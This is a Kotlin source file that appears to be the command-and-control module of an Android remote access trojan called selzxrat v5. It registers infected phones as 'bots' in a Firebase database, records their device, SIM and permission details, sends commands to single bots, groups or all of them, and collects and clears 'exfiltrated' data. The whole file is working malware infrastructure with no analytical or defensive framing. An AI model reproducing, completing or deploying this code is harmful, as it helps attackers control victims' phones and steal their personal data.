package com.selzxrat.v5

import android.content.Context
import android.util.Log
import com.google.firebase.database.*
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

data class BotInfo(
    val deviceId: String = "",
    val deviceName: String = "",
    val deviceModel: String = "",
    val androidVersion: String = "",
    val manufacturer: String = "",
    val isOnline: Boolean = false,
    val lastSeen: Long = 0L,
    val ipAddress: String = "",
    val country: String = "",
    val batteryLevel: Int = 0,
    val isCharging: Boolean = false,
    val ramTotal: Long = 0L,
    val ramAvailable: Long = 0L,
    val storageTotal: Long = 0L,
    val storageAvailable: Long = 0L,
    val installedApps: Int = 0,
    val isAccessibilityEnabled: Boolean = false,
    val isNotificationListenerEnabled: Boolean = false,
    val isAdminEnabled: Boolean = false,
    val isScreenLocked: Boolean = false,
    val simInfo: String = ""
)

data class C2Command(
    val cmdId: String = "",
    val type: String = "",
    val payload: String = "",
    val timestamp: Long = System.currentTimeMillis(),
    val status: String = "pending"
)

data class ExfiltratedData(
    val dataId: String = "",
    val type: String = "",
    val content: String = "",
    val timestamp: Long = System.currentTimeMillis(),
    val deviceId: String = ""
)

object C2Manager {
    private const val TAG = "C2Manager"
    private const val FIREBASE_URL = "https://selzxrat-v5-c2-default-rtdb.firebaseio.com"
    private const val REF_BOTS = "selzxratV5/bots"
    private const val REF_COMMANDS = "selzxratV5/commands"
    private const val REF_EXFIL = "selzxratV5/exfiltrated"
    private const val REF_BROADCAST = "selzxratV5/broadcast"
    private const val REF_GROUPS = "selzxratV5/groups"

    private lateinit var database: FirebaseDatabase
    private lateinit var botsRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private lateinit var exfilRef: DatabaseReference
    private lateinit var broadcastRef: DatabaseReference
    private lateinit var groupsRef: DatabaseReference

    private var _onBotUpdate: ((String, BotInfo) -> Unit)? = null
    private var _onCommandReceived: ((C2Command) -> Unit)? = null
    private var _onExfilReceived: ((ExfiltratedData) -> Unit)? = null
    private var _onBotDisconnected: ((String) -> Unit)? = null
    private var _onConnectionError: ((String) -> Unit)? = null

    private var botListeners = mutableMapOf<String, ValueEventListener>()
    private var commandListener: ValueEventListener? = null
    private var exfilListener: ValueEventListener? = null

    fun onBotUpdate(callback: (String, BotInfo) -> Unit) { _onBotUpdate = callback }
    fun onCommandReceived(callback: (C2Command) -> Unit) { _onCommandReceived = callback }
    fun onExfilReceived(callback: (ExfiltratedData) -> Unit) { _onExfilReceived = callback }
    fun onBotDisconnected(callback: (String) -> Unit) { _onBotDisconnected = callback }
    fun onConnectionError(callback: (String) -> Unit) { _onConnectionError = callback }

    fun initialize() {
        try {
            database = FirebaseDatabase.getInstance(FIREBASE_URL)
            database.setPersistenceEnabled(true)
            botsRef = database.getReference(REF_BOTS)
            commandsRef = database.getReference(REF_COMMANDS)
            exfilRef = database.getReference(REF_EXFIL)
            broadcastRef = database.getReference(REF_BROADCAST)
            groupsRef = database.getReference(REF_GROUPS)
            Log.d(TAG, "C2Manager initialized successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize C2Manager: ${e.message}")
            _onConnectionError?.invoke("Init error: ${e.message}")
        }
    }

    fun startListening() {
        listenForBots()
        listenForCommands()
        listenForExfil()
    }

    fun stopListening() {
        botListeners.values.forEach { botsRef.removeEventListener(it) }
        botListeners.clear()
        commandListener?.let { commandsRef.removeEventListener(it) }
        exfilListener?.let { exfilRef.removeEventListener(it) }
    }

    private fun listenForBots() {
        botsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val bot = snapshot.getValue(BotInfo::class.java) ?: return
                _onBotUpdate?.invoke(snapshot.key ?: "", bot)
                listenBotStatus(snapshot.key ?: "")
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                val bot = snapshot.getValue(BotInfo::class.java) ?: return
                _onBotUpdate?.invoke(snapshot.key ?: "", bot)
            }

            override fun onChildRemoved(snapshot: DataSnapshot) {
                _onBotDisconnected?.invoke(snapshot.key ?: "")
            }

            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                _onConnectionError?.invoke("Bots listener cancelled: ${error.message}")
            }
        })
    }

    private fun listenBotStatus(deviceId: String) {
        if (botListeners.containsKey(deviceId)) return
        val listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val bot = snapshot.getValue(BotInfo::class.java) ?: return
                _onBotUpdate?.invoke(deviceId, bot)
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        botsRef.child(deviceId).addValueEventListener(listener)
        botListeners[deviceId] = listener
    }

    private fun listenForCommands() {
        commandListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (cmdSnapshot in snapshot.children) {
                    val cmd = cmdSnapshot.getValue(C2Command::class.java) ?: continue
                    _onCommandReceived?.invoke(cmd)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                _onConnectionError?.invoke("Commands listener cancelled: ${error.message}")
            }
        }
        commandsRef.addValueEventListener(commandListener!!)
    }

    private fun listenForExfil() {
        exfilListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (dataSnapshot in snapshot.children) {
                    val data = dataSnapshot.getValue(ExfiltratedData::class.java) ?: continue
                    _onExfilReceived?.invoke(data)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                _onConnectionError?.invoke("Exfil listener cancelled: ${error.message}")
            }
        }
        exfilRef.addValueEventListener(exfilListener!!)
    }

    fun sendCommand(botId: String, type: String, payload: String = "") {
        val cmdId = commandsRef.push().key ?: return
        val cmd = C2Command(
            cmdId = cmdId,
            type = type,
            payload = payload,
            timestamp = System.currentTimeMillis(),
            status = "pending"
        )
        commandsRef.child(cmdId).setValue(cmd).addOnCompleteListener { task ->
            if (task.isSuccessful) {
                Log.d(TAG, "Command sent: $type to $botId")
            } else {
                _onConnectionError?.invoke("Failed to send command: ${task.exception?.message}")
            }
        }
    }

    fun broadcastCommand(type: String, payload: String = "") {
        val cmdId = broadcastRef.push().key ?: return
        val cmd = C2Command(
            cmdId = cmdId,
            type = type,
            payload = payload,
            timestamp = System.currentTimeMillis(),
            status = "broadcast"
        )
        broadcastRef.child(cmdId).setValue(cmd)
    }

    fun sendCommandToGroup(groupId: String, type: String, payload: String = "") {
        val cmdId = groupsRef.child(groupId).child("commands").push().key ?: return
        val cmd = C2Command(
            cmdId = cmdId,
            type = type,
            payload = payload,
            timestamp = System.currentTimeMillis(),
            status = "group"
        )
        groupsRef.child(groupId).child("commands").child(cmdId).setValue(cmd)
    }

    fun removeBot(deviceId: String) {
        botsRef.child(deviceId).removeValue()
        botListeners[deviceId]?.let { botsRef.removeEventListener(it) }
        botListeners.remove(deviceId)
    }

    fun getBots(callback: (Map<String, BotInfo>) -> Unit) {
        botsRef.get().addOnSuccessListener { snapshot ->
            val bots = mutableMapOf<String, BotInfo>()
            for (child in snapshot.children) {
                child.getValue(BotInfo::class.java)?.let { bot ->
                    bots[child.key ?: ""] = bot
                }
            }
            callback(bots)
        }.addOnFailureListener {
            _onConnectionError?.invoke("Failed to get bots: ${it.message}")
        }
    }

    fun getExfiltratedData(callback: (List<ExfiltratedData>) -> Unit) {
        exfilRef.get().addOnSuccessListener { snapshot ->
            val data = mutableListOf<ExfiltratedData>()
            for (child in snapshot.children) {
                child.getValue(ExfiltratedData::class.java)?.let { data.add(it) }
            }
            callback(data)
        }
    }

    fun clearExfiltratedData() {
        exfilRef.removeValue()
    }

    fun getStorageRef(): StorageReference {
        return FirebaseStorage.getInstance().reference
    }

    fun getCurrentTimestamp(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date())
    }

    fun destroy() {
        stopListening()
        _onBotUpdate = null
        _onCommandReceived = null
        _onExfilReceived = null
        _onBotDisconnected = null
        _onConnectionError = null
    }
                  }
